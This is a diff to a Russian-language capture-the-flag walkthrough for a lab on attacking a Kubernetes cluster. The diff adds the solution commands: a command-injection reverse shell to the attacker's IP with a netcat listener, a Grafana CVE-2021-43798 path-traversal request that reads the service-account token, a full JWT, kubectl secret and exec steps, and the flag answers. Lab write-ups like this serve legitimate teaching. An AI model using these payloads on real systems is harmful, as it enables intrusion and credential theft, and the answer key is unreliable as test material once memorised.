@@ -27,18 +27,30 @@
 ### Ответьте на вопросы ниже
 Какие порты открыты? (через запятую)
 ```commandline
+nmap -sC -sV <IP>
+```
+```commandline
 22,80
 ```
 
 ## Задание 2
 Посетите веб-сайт, он берет хост и возвращает вывод команды ping.
 
-Используйте инъекцию команд, чтобы получить обратную оболочку. Для получения дополнительной информации об атаках с инъекцией команд посетите эту комнату
+Используйте инъекцию команд, чтобы получить обратную оболочку. Для получения дополнительной информации об атаках с 
+инъекцией команд посетите эту комнату
 
 Флаг вы найдете в переменной окружения.
 
 ### Ответьте на вопросы ниже
 Что такое флаг 1?
+```commandline
+http://<IP>
+<IP> && whoami
+<IP> && ls &&  bash -c 'bash -i >& /dev/tcp/<your_own_IP>/4444 0>&1'
+nc -nvlp <IP>
+id
+env
+```
 ```commandline
 flag{5e7cc6165f6c2058b11710a26691bb6b}
 ```
@@ -99,6 +111,12 @@ secrets                                         []                              
 ```
 ### Ответьте на вопросы ниже
 ```commandline
+find / -name "kubectl"
+cd /tmp
+ls
+./kubectl auth can-i create pods
+```
+```commandline
 Ответ не нужен
 ```
 
@@ -125,6 +143,9 @@ syringe-token-g85mg     kubernetes.io/service-account-token   3      41d
 
 ### Ответьте на вопросы ниже
 Что такое флаг 2?
+```commandline
+./kubectl get secrets
+```
 ```commandline
 flag{df2a636de15108a4dc41135d930d8ec1}
 ```
@@ -183,6 +204,9 @@ http://grafana:3000 или к конечной точке Grafana в моем с
 ### Ответьте на вопросы ниже
 Какая версия Grafana установлена на компьютере?
 ```commandline
+curl http://<IP>:3000/login > /tmp/curl.txt
+```
+```commandline
 8.3.0-beta2
 ```
 Какой CVE вы обнаружили?
@@ -191,13 +215,15 @@ CVE-2021-43798
 ```
 
 ## Задание 6
-Kubernetes хранит токен учетной записи службы, запускающей модуль, в /var/run/secrets/kubernetes.io/serviceaccount/token.   
+Kubernetes хранит токен учетной записи службы, запускающей модуль, в `/var/run/secrets/kubernetes.io/serviceaccount/token`.   
 
-Используйте уязвимость LFI для извлечения токена. Токен подписан JWTкластером.
+Используйте уязвимость LFI для извлечения токена. Токен подписан JWT кластером.
 
-Используйте --tokenфлаг kubectlдля использования новой учетной записи службы. Еще раз используйте kubectlдля проверки разрешений этой учетной записи.
+Используйте --token флаг kubectl для использования новой учетной записи службы. Еще раз используйте kubectlдля 
+проверки разрешений этой учетной записи.
 
 Инсекубэ
+```commandline
 challenge@syringe:/tmp$ ./kubectl auth can-i --list --token=${TOKEN}
 Resources                                       Non-Resource URLs                     Resource Names   Verbs
 *.*                                             []                                    []               [*]
@@ -222,22 +248,34 @@ selfsubjectrulesreviews.authorization.k8s.io    []                              
                                                 [/version/]                           []               [get]
                                                 [/version]                            []               [get]
                                                 [/version]                            []               [get]
+```
 Учетная запись может делать *глагол на *.*ресурсе. Это означает, что это cluster-admin. С этой учетной записью службы вы сможете запустить любую kubectlкоманду. Например, попробуйте получить список подов.
 
 Инсекубэ
+```commandline
 challenge@syringe:/tmp$ ./kubectl get pods --token=${TOKEN}
 NAME                       READY   STATUS    RESTARTS       AGE
 grafana-57454c95cb-v4nrk   1/1     Running   10 (17d ago)   41d
 syringe-79b66d66d7-7mxhd   1/1     Running   1 (17d ago)    18d
+```
 Используйте kubectl execдля получения оболочки в модуле Grafana. Флаг 3 вы найдете в переменных окружения.
 
 Инсекубэ
+```commandline
 challenge@syringe:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
 Unable to use a TTY - input is not a terminal or the right kind of file
 hostname
 grafana-57454c95cb-v4nrk
+```
 ### Ответьте на вопросы ниже
 Каково имя учетной записи службы, запускающей службу Grafana?
+```commandline
+curl -v --path-as-is -H "Content-Type: application/json" http://<IP>:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzM4NzE2MDA3LCJpYXQiOjE3MDcxODAwMDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItZjlqczUiLCJ1aWQiOiI4N2RiNDhiMC1kMTc2LTQyOGMtOWZhNS0yZDVkMzlmMjU4NjcifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6ImIwMWIwODc5LWNlMDItNDAxNC1iNjEyLTEyOWVlYzAxNjdiNCJ9LCJ3YXJuYWZ0ZXIiOjE3MDcxODM2MTR9LCJuYmYiOjE3MDcxODAwMDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.C3nxdd-vf8ugcs1Sxu8yWsgfxhYRxEg7ZcXQayLREwYzw1rhuBq2s3tZGIw31wSXhu2_FZ6_vPReVm12HAU7_UX-aDexUN4biM0fDgSLCs_vqdVo4xFw81gT3-DdRV-EAzMtxdQCRnL4uE95Sw7CvdPWYUZobyWAkUhLkivLWSEAfWRMiYI_y3iHcGMQ-vp6xva6fWVwVByVm-kToXtEslWjkqt4Iv-hB8ai97Hsm5TwNsg8q5gu-jB28i_UDSYdNOWYN2PszE9lPB2wjXovEmoY6WQe3nhfnNx_QKSAD6yRb6bUr2GLjMBxniHgM0-DFgEd4SGNNSUvCdfynm9cOQ
+./kubectl get po -A
+./kubectl exec -it grafana-57454c95cb-f9js5 --token=$TOKEN -- /bin/bash
+./kubectl describe pod everything-allowed-exec-pod --token=$TOKEN
+```
 ```commandline
 developer
 ```
@@ -256,7 +294,7 @@ flag{288232b2f03b1ec422c5dae50f14061f}
 Имея доступ администратора к кластеру, вы можете создавать любые ресурсы, которые захотите. В этой статье 
 объясняется, как получить доступ к узлам Kubernetes, запустив pod, который монтирует файловую систему узла.
 
-Вы можете создать «плохой» pod на основе их первого примера случая . Вам понадобится небольшая модификация, 
+Вы можете создать «плохой» pod на основе их первого примера случая. Вам понадобится небольшая модификация, 
 поскольку у виртуальной машины нет подключения к Интернету, поэтому она не может извлечь ubuntuобраз контейнера. 
 Образ доступен в локальном реестре docker minikube, поэтому вам просто нужно указать Kubernetes использовать 
 локальную версию вместо ее извлечения. Вы можете добиться этого, добавив  imagePullPolicy: Neverв свой «плохой» 
